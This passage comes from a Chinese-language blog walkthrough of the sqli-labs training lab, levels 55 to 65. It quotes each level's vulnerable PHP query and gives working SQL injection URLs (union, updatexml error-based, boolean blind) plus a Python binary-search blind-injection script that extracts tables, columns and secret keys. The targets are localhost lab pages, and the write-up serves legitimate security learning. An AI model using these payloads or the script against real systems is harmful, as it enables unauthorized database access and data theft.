<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-55/?id=1) and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;k4zjl1xcqj&apos;%23</span><br></pre></td></tr></table></figure>
<p>获取key值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-55/?id=1) and 1=2 union select 1,group_concat(id,0x7e,sessid,0x7e,secret_Z0C2,0x7e,tryy),3 from k4zjl1xcqj%23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569982565942.png" alt="1569982565942"></p>
<p>提交获取到的key值即可</p>
<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>这里也是sql语句拼接发生了变化，修改即可</p>
<p>查询数据表名与列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-56/?id=1&apos;) and 1=2 union select 1,(select table_name from information_schema.tables where table_schema=database()),(select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() ) limit 2,1)%23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569983390408.png" alt="1569983390408"></p>
<p>查询出数据提交key值即可</p>
<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id= <span class="string">'"'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>Less-57sql数据库拼接使用了双引号，其余的和之前一样</p>
<p>查询数据表名和列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-57/?id=1&quot; and 1=2 union select 1,(select table_name from information_schema.tables where table_schema=database()),(select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() ) limit 2,1)%23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569983736299.png" alt="1569983736299"></p>
<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$times= <span class="number">5</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FFFF"&gt;'</span>;	</span><br><span class="line">	$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">	$pass = array_reverse($unames);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的测试次数变成了5，sql语句拼接和Less-54是一样的，并且直接不显示查询出来的结果，而是利用查询返回的id作为索引从数组中读取，这里只能使用报错注入(因为限制了次数导致了我们没法使用盲注)，这里限制次数变成了5次，我们通过修改语句，使其一次性注入出表名和列名</p>
<p>查询数据表名和列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-58/?id=2&apos; and updatexml(1,concat(&apos;~&apos;,(select table_name from information_schema.tables where table_schema=database()),0x7e,(select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() ) limit 2,1)),0) %23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569985183435.png" alt="1569985183435"></p>
<p>查询key值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-58/?id=2&apos; and updatexml(1,concat(&apos;~&apos;,(select secret_BNT9 from zr7dr1i8l1)),0) %23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569985255015.png" alt="1569985255015"></p>
<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FFFF"&gt;'</span>;	</span><br><span class="line">	$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">	$pass = array_reverse($unames);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Less-59这里与less-54的区别之处在于，SQL语句拼接发生了变化，这里同样采用报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-59/?id=2 and updatexml(1,concat(&apos;~&apos;,(select table_name from information_schema.tables where table_schema=database()),0x7e,(select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() ) limit 2,1)),0) %23</span><br></pre></td></tr></table></figure>
<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'("'</span>.$id.<span class="string">'")'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>与Less-59一致，仅sql语句拼接发生变化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-60/?id=2&quot;) and updatexml(1,concat(&apos;~&apos;,(select table_name from information_schema.tables where table_schema=database()),0x7e,(select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() ) limit 2,1)),0) %23</span><br></pre></td></tr></table></figure>
<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>sql语句拼接发生变化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-61/?id=2&apos;)) and updatexml(1,concat(&apos;~&apos;,(select table_name from information_schema.tables where table_schema=database()),0x7e,(select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() ) limit 2,1)),0) %23</span><br></pre></td></tr></table></figure>
<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$times= <span class="number">130</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FFFF"&gt;'</span>;	</span><br><span class="line">	$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">	$pass = array_reverse($unames);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="comment">//	print_r(mysql_error());</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的尝试次数变成了130次，且去掉了报错的输出，明显考察盲注，这里我们使用基于布尔的盲注猜解出表名和字段名。</p>
<p>这里的130次限制最终还是没绕过，TCL，但是发现即使是超次数了也能注入。</p>
<p>直接附上二分法盲注脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://localhost/sqli-labs/less-62/?id=1')"</span></span><br><span class="line">key = <span class="string">"Angelina"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SearchTbName</span><span class="params">(url)</span>:</span></span><br><span class="line">    DbName = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"[+]Test &#123;0&#125; Bytes"</span>.format(i))</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        stop = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt;= stop):</span><br><span class="line">            mid = int((start + stop)/<span class="number">2</span>)</span><br><span class="line">            payload = <span class="string">" and ascii(mid((select table_name from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;%23"</span>.format(i,mid)</span><br><span class="line">            reqUrl = url + payload</span><br><span class="line">            print(reqUrl)</span><br><span class="line">            cont = requests.get(reqUrl)</span><br><span class="line">            conTrue = requests.get(url + <span class="string">" and ascii(mid((select table_name from information_schema.tables where table_schema=database()),&#123;0&#125;,1))=&#123;1&#125;%23"</span>.format(i,mid))</span><br><span class="line">            <span class="keyword">if</span>(key <span class="keyword">in</span> conTrue.text):</span><br><span class="line">                DbName += chr(mid)</span><br><span class="line">                print(DbName)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(key <span class="keyword">in</span> cont.text):</span><br><span class="line">                <span class="comment">#print("[+] start",start,stop,mid)</span></span><br><span class="line">                start = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                stop = mid</span><br><span class="line">    <span class="keyword">return</span> DbName</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SearchCnName</span><span class="params">(url)</span>:</span></span><br><span class="line">    DbName = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>,<span class="number">21</span>):</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"[+]Test &#123;0&#125; Bytes"</span>.format(i))</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        stop = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt;= stop):</span><br><span class="line">            mid = int((start + stop)/<span class="number">2</span>)</span><br><span class="line">            payload = <span class="string">"and ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database())),&#123;0&#125;,1))&gt;&#123;1&#125;%23"</span>.format(i,mid)</span><br><span class="line">            reqUrl = url + payload</span><br><span class="line">            print(reqUrl)</span><br><span class="line">            cont = requests.get(reqUrl)</span><br><span class="line">            conTrue = requests.get(url + <span class="string">"and ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database())),&#123;0&#125;,1))=&#123;1&#125;%23"</span>.format(i,mid))</span><br><span class="line">            <span class="keyword">if</span>(key <span class="keyword">in</span> conTrue.text):</span><br><span class="line">                DbName += chr(mid)</span><br><span class="line">                print(DbName)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(key <span class="keyword">in</span> cont.text):</span><br><span class="line">                <span class="comment">#print("[+] start",start,stop,mid)</span></span><br><span class="line">                start = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                stop = mid</span><br><span class="line">    <span class="keyword">return</span> DbName</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SearchDataName</span><span class="params">(url,ColumnName,TbName)</span>:</span></span><br><span class="line">    DbName = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"[+]Test &#123;0&#125; Bytes"</span>.format(i))</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        stop = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt;= stop):</span><br><span class="line">            mid = int((start + stop)/<span class="number">2</span>)</span><br><span class="line">            payload = <span class="string">" and ascii(mid((select &#123;0&#125; from challenges.&#123;1&#125;),&#123;2&#125;,1))&gt;&#123;3&#125;%23"</span>.format(ColumnName,TbName,i,str(mid))</span><br><span class="line">            reqUrl = url + payload</span><br><span class="line">            print(reqUrl)</span><br><span class="line">            cont = requests.get(reqUrl)</span><br><span class="line">            conTrue = requests.get(url + <span class="string">" and ascii(mid((select &#123;0&#125; from challenges.&#123;1&#125;),&#123;2&#125;,1))=&#123;3&#125;%23"</span>.format(ColumnName,TbName,i,str(mid)))</span><br><span class="line">            print(url + <span class="string">" and ascii(mid((select &#123;0&#125; from &#123;1&#125;),&#123;2&#125;,1))=&#123;3&#125;%23"</span>.format(ColumnName,TbName,i,str(mid)))</span><br><span class="line">            <span class="keyword">if</span>(key <span class="keyword">in</span> conTrue.text):</span><br><span class="line">                DbName += chr(mid)</span><br><span class="line">                print(DbName)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(key <span class="keyword">in</span> cont.text):</span><br><span class="line">                start = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                stop = mid</span><br><span class="line">    <span class="keyword">return</span> DbName</span><br><span class="line"></span><br><span class="line">TbName = SearchTbName(url)</span><br><span class="line">print(<span class="string">"[+]Column Name"</span>,TbName)</span><br><span class="line">CnName = SearchCnName(url)</span><br><span class="line">print(<span class="string">"[+]Column Name"</span>,CnName)</span><br><span class="line">ColumnName = CnName</span><br><span class="line">DaName = SearchDataName(url,ColumnName,TbName)</span><br><span class="line">print(<span class="string">"[+]Data Name"</span>,DaName)</span><br></pre></td></tr></table></figure>
<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
<p>Less-63与Less-62区别之处在于，sql语句拼接，这里同样使用基于布尔的二分法盲注,这里稍微改一下payload即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-63/?id=1&apos; and length(database())&gt;1%23</span><br></pre></td></tr></table></figure>
<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id=(($id)) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>这里也是sql语句拼接发生了变化，同样注释掉了报错语句，可以使用基于布尔的盲注和延时盲注</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-64/?id=1)) and length(database())&gt;1%23</span><br></pre></td></tr></table></figure>
<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id=($id) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>最后一关了，hhh，还是sql语句拼接发生了变化，注释掉了报错语句，使用盲注(布尔，延时)来进行注入，修改之前的payload即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-65/?id=1) and length(database())&gt;1%23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1570206509430.png" alt="1570206509430"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
<p><a href="https://www.cnblogs.com/roverliang/p/6287416.html" target="_blank" rel="noopener">https://www.cnblogs.com/roverliang/p/6287416.html</a> 派生表</p>
<p><a href="https://www.jianshu.com/p/62d394c38230" target="_blank" rel="noopener">https://www.jianshu.com/p/62d394c38230</a>   Less-17 超详细解答</p>
</blockquote>
  
	</div>
		<footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/安全竞赛/">安全竞赛</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/sqli-labs/">sqli-labs</a><a href="/tags/sql注入/">sql注入</a>
  </div>

</div>



	<div class="article-share" id="share">
	
	  <div data-url="http://flag0.com/2019/10/05/sqli-lib/" data-title="sqli-labs刷题笔记 | flag0&#39;s Blog" data-tsina="" class="share clearfix">
	  </div>
	
	</div>


</footer>

   	       
	</article>
	
<nav class="article-nav clearfix">
 
 <div class="prev" >
 <a href="/2019/10/06/北极星杯AWD总结/" title="北极星杯AWD总结">
  <strong>上一篇：</strong><br/>
  <span>
  北极星杯AWD总结</span>
</a>
</div>


<div class="next">
<a href="/2019/09/27/2019安恒杯Web安全测试大赛练习赛Writeup/"  title="2019安恒杯Web安全测试大赛练习赛Writeup">
 <strong>下一篇：</strong><br/> 
 <span>2019安恒杯Web安全测试大赛练习赛Writeup
</span>
</a>
</div>

</nav>

	



</div>  
      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>

  <div id="toc" class="toc-aside">
  <strong class="toc-title">文章目录</strong>
 
 <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-1-union"><span class="toc-number">1.</span> <span class="toc-text">Less-1 union</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-2-union"><span class="toc-number">2.</span> <span class="toc-text">Less-2 union</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-3-union"><span class="toc-number">3.</span> <span class="toc-text">Less-3 union</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-4-union"><span class="toc-number">4.</span> <span class="toc-text">Less-4 union</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-5"><span class="toc-number">5.</span> <span class="toc-text">Less-5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-6"><span class="toc-number">6.</span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-7"><span class="toc-number">7.</span> <span class="toc-text">Less-7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-8"><span class="toc-number">8.</span> <span class="toc-text">Less-8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-9"><span class="toc-number">9.</span> <span class="toc-text">Less-9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-10"><span class="toc-number">10.</span> <span class="toc-text">Less-10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-11-login-inject"><span class="toc-number">11.</span> <span class="toc-text">Less-11 login inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-12-login-inject"><span class="toc-number">12.</span> <span class="toc-text">Less-12 login inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-13-login-inject"><span class="toc-number">13.</span> <span class="toc-text">Less-13 login inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-14-login-inject"><span class="toc-number">14.</span> <span class="toc-text">Less-14 login inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-15-login-inject"><span class="toc-number">15.</span> <span class="toc-text">Less-15 login inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-16-login-inject"><span class="toc-number">16.</span> <span class="toc-text">Less-16 login inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-17-update"><span class="toc-number">17.</span> <span class="toc-text">Less-17 update</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-18-insert"><span class="toc-number">18.</span> <span class="toc-text">Less-18 insert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-19-insert"><span class="toc-number">19.</span> <span class="toc-text">Less-19 insert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-20-cookie"><span class="toc-number">20.</span> <span class="toc-text">Less-20 cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-21-cookie"><span class="toc-number">21.</span> <span class="toc-text">Less-21 cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-22-cookie"><span class="toc-number">22.</span> <span class="toc-text">Less-22 cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-23"><span class="toc-number">23.</span> <span class="toc-text">Less-23</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-24-二次注入"><span class="toc-number">24.</span> <span class="toc-text">Less-24 二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-25"><span class="toc-number">25.</span> <span class="toc-text">Less-25</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-26"><span class="toc-number">26.</span> <span class="toc-text">Less-26</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-27"><span class="toc-number">27.</span> <span class="toc-text">Less-27</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-28"><span class="toc-number">28.</span> <span class="toc-text">Less-28</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-29"><span class="toc-number">29.</span> <span class="toc-text">Less-29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-30"><span class="toc-number">30.</span> <span class="toc-text">Less-30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-31"><span class="toc-number">31.</span> <span class="toc-text">Less-31</span></a></li><li class="toc-item toc-level-2"><a 